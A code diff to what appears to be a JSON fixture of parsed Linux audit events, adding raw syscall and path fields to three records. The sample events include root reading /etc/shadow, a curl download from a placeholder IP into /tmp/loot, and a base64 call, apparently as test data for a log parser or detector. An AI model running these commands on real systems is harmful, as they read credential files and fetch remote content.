@@ -8,7 +8,33 @@
     "targetFilename": "",
     "user": "root",
     "currentDirectory": "/root",
-    "ppid": 1200
+    "ppid": 1200,
+    "raw": {
+      "AUID": "root",
+      "UID": "root",
+      "a0": "cat",
+      "a1": "/etc/shadow",
+      "argc": "2",
+      "comm": "cat",
+      "cwd": "/root",
+      "exe": "/usr/bin/cat",
+      "ppid": "1200",
+      "uid": "0"
+    },
+    "multi": {
+      "name": [
+        "/etc/shadow"
+      ],
+      "nametype": [
+        "NORMAL"
+      ],
+      "type": [
+        "CWD",
+        "EXECVE",
+        "PATH",
+        "SYSCALL"
+      ]
+    }
   },
   {
     "time": "2021-07-18T12:29:24Z",
@@ -18,7 +44,27 @@
     "parentImage": "",
     "targetFilename": "",
     "user": "u",
-    "currentDirectory": "/home/u"
+    "currentDirectory": "/home/u",
+    "raw": {
+      "UID": "u",
+      "a0": "curl",
+      "a1": "-s",
+      "a2": "http://192.0.2.1/x",
+      "a3": "-o",
+      "a4": "/tmp/loot",
+      "argc": "5",
+      "comm": "curl",
+      "cwd": "/home/u",
+      "exe": "/usr/bin/curl",
+      "uid": "1000"
+    },
+    "multi": {
+      "type": [
+        "CWD",
+        "EXECVE",
+        "SYSCALL"
+      ]
+    }
   },
   {
     "time": "2021-07-18T12:29:25.5Z",
@@ -28,6 +74,16 @@
     "parentImage": "",
     "targetFilename": "",
     "user": "1000",
-    "currentDirectory": ""
+    "currentDirectory": "",
+    "raw": {
+      "exe": "/usr/bin/base64",
+      "uid": "1000"
+    },
+    "multi": {
+      "type": [
+        "PROCTITLE",
+        "SYSCALL"
+      ]
+    }
   }
 ]
